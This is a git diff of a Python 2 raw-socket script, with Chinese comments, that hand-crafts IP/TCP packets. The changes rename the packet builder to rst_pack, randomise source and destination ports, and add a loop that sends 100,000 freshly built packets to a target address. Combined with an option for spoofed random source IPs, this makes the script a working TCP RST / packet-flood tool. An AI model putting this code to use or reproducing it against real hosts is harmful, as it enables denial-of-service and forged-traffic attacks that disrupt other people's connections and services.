@@ -6,23 +6,14 @@
 import sys, socket
 from struct import *
 import random
+from header import *
 
 IP_RANDOM = True
 PORT_RANDOM = True
 ip_dest = '127.0.0.1'
 ip_source = '127.0.0.1'
-
-def ip_random():
-    ip = ''
-    for i in range(4):
-        num = random.randint(0,255)
-        ip += str(num)
-        if i != 3:
-            ip += '.'
-    return ip
-
-def port_random():
-    return random.randint(0,65535)
+SEND_TIMES = 100000
+PACK_EVERY_TIME = True
 
 def carry_around_add(a, b):
     c = a + b
@@ -40,7 +31,7 @@ try:
 except socket.error , msg:
     print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
     sys.exit()
-def set_pack():
+def rst_pack():
     # ip_source = '127.0.0.1' #本机IP
     # ip_dest = '127.0.0.1'	#也可以用域名：socket.gethostbyname('www.microsoft.com')
 
@@ -67,8 +58,10 @@ def set_pack():
     tcp_sport = 22222	# source port
     tcp_dport = 80		# destination port
     if PORT_RANDOM:
+        tcp_sport = port_random()
+        tcp_dport = port_random()
         
-    tcp_seq = 19890604	# 32-bit sequence number，这里随便指定个
+    tcp_seq = 7677	# 32-bit sequence number，这里随便指定个
     tcp_ack_seq = 0		# 32-bit ACK number。这里不准备构建ack包，故设为0
     tcp_data_offset = 5	# 和ip header一样，没option field
     # 下面是各种tcp flags
@@ -124,4 +117,13 @@ def set_pack():
 #     if i ==1000000:
 #         break
 
-def send_packet(n):
+def send_packet():
+    n = SEND_TIMES
+    packet = rst_pack()
+    for _ in range(n):
+        if PACK_EVERY_TIME:
+            packet = rst_pack()
+        s.sendto(packet, (ip_dest, 0))
+
+if __name__ == '__main__':
+    send_packet()
